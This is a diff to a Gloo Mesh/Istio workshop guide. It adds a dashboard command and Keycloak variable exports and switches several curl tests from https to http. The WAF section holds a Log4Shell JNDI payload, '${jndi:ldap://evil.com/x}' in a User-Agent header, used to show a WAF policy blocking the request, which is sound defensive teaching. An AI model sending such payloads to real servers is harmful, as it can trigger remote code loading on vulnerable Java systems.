@@ -127,6 +127,10 @@ meshctl cluster register \
 
 4. Verify proper installation by opening the Gloo Mesh UI by running `meshctl dashboard`. Click [here](problems-dashboard.md) if that command did not work. 
 
+```sh
+meshctl dashboard
+```
+
 ## Lab 3 - Deploy Istio on the Workload Clusters<a name="Lab-3"></a>
 
 1. Install [istioctl](https://istio.io/latest/docs/setup/getting-started/)
@@ -822,7 +826,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a bad JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${HTTP_GATEWAY_ENDPOINT}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://${HTTP_GATEWAY_ENDPOINT}/
 ```
 
 **WAF policy**
@@ -887,10 +891,10 @@ EOF
 4. Try the request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${HTTP_GATEWAY_ENDPOINT}/
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://${HTTP_GATEWAY_ENDPOINT}/
 ```
 
-Note that the is now blocked with the custom intervention message from the WAF policy. 
+Note that the is now blocked with the custom intervention message from the WAF policy.
 
 ```sh
 HTTP/2 403
@@ -996,7 +1000,7 @@ EOF
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET https://${HTTP_GATEWAY_ENDPOINT}/ | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET http://${HTTP_GATEWAY_ENDPOINT}/ | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
@@ -1021,6 +1025,11 @@ First we need to deploy our OIDC server keycloak. We provided you with a script 
 ```sh
 export ENDPOINT_HTTPS_GW_CLUSTER1_EXT=$HTTP_GATEWAY_ENDPOINT
 ./install/keycloak/setup.sh
+
+export KEYCLOAK_URL=$(kubectl get configmap -n gloo-mesh --context $CLUSTER1 keycloak-info -o json | jq -r '.data."keycloak-url"')
+export KEYCLOAK_CLIENTID=$(kubectl get configmap -n gloo-mesh --context $CLUSTER1 keycloak-info -o json | jq -r '.data."client-id"')
+
+
 ```
 
 The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
